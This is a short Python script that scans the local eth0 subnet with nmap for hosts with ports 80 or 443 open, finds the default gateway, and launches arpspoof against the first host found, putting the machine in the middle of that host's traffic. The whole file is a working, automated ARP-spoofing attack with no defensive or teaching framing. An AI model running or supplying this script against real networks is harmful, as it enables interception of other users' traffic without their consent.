import os
import psutil
import ipaddress
import subprocess
import re
def get_network_cidr():
    # Get network interfaces and their addresses
    net_if_addrs = psutil.net_if_addrs()
    
    for interface, addrs in net_if_addrs.items():
        for addr in addrs:
            if addr.family == 2:  # AF_INET is family 2 for IPv4 addresses
                ip = addr.address
                netmask = addr.netmask
                
                # Calculate the network in CIDR notation using ipaddress
                network = ipaddress.IPv4Interface(f"{ip}/{netmask}")
                if interface == "eth0":
                    return network.network
def find_hosts_with_open_ports(file_path):
    
    open_hosts = []
    current_ip = None
    ports_open = {"80": False, "443": False}

    with open(file_path, 'r') as file:
        for line in file:
            # Check for IP address in the Nmap scan report line
            ip_match = re.search(r'Nmap scan report for .*?(\d+\.\d+\.\d+\.\d+)', line)
            if ip_match:
                if current_ip and any(ports_open.values()):
                    open_hosts.append(current_ip)

                # Update the current IP and reset port states
                current_ip = ip_match.group(1)
                ports_open = {"80": False, "443": False}

            # Check for port states
            port_match = re.search(r'(\d+)/tcp\s+open', line)
            if port_match:
                port = port_match.group(1)
                if port in ports_open:
                    ports_open[port] = True

        # Check the last host in the file
        if current_ip and any(ports_open.values()):
            open_hosts.append(current_ip)

    return open_hosts

def getrouterip():
    cmd1= "netstat -nr | awk '$1 == \"0.0.0.0\"{print$2}'"
    cmd1 = subprocess.check_output(cmd1, shell=True, text=True)
    cmd1 = cmd1.split()
    cmd1 = cmd1[0]
    return cmd1

def attack(targ, router):
    cmd = f"arpspoof -i eth0 -t {targ} {router}"
    print("Attacking:")
    print(subprocess.check_output(cmd, shell=True, text=True))

subnet = get_network_cidr()
nmapscan = f"nmap -p 80,443 {subnet} > result.txt"
ans = subprocess.check_output(nmapscan, shell=True, text=True)
print("Ran")
ips = find_hosts_with_open_ports("result.txt")
print(ips)
if len(ips) == 0:
    raise Exception("No targets found, terminating...")
target = ips[0]
routerip = getrouterip()
attack(target, routerip)
